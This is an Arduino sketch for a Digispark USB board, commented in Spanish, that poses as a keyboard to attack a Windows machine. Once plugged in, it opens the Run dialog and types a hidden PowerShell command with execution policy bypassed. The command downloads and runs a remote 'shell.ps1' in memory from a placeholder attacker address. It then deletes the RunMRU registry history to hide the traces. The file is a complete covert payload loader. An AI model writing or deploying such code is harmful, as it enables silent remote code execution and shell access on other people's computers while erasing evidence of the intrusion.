#include "DigiKeyboard.h"
#include "DigiKeyboardEs.h"

void setup() {
  pinMode(1, OUTPUT);
  digitalWrite(1, LOW);
  
  // Espera inicial
  DigiKeyboardEs.delay(8000);
  digitalWrite(1, HIGH);
  
  // ====== SOLO DESCARGAR Y EJECUTAR EN MEMORIA ======
  
  // 1. Abrir PowerShell oculto
  DigiKeyboardEs.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardEs.delay(1500);
  
  // 2. Comando que descarga y ejecuta en memoria
  DigiKeyboardEs.print("powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"");
  DigiKeyboardEs.print("IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/shell.ps1')\"");
  
  DigiKeyboardEs.sendKeyStroke(KEY_ENTER);
  DigiKeyboardEs.delay(5000);
  
  // 3. Limpieza rápida
  DigiKeyboardEs.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardEs.delay(1000);
  DigiKeyboardEs.print("cmd /c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f >nul 2>&1");
  DigiKeyboardEs.sendKeyStroke(KEY_ENTER);
  
  // LED final
  digitalWrite(1, LOW);
  delay(500);
  digitalWrite(1, HIGH);
}

void loop() {}
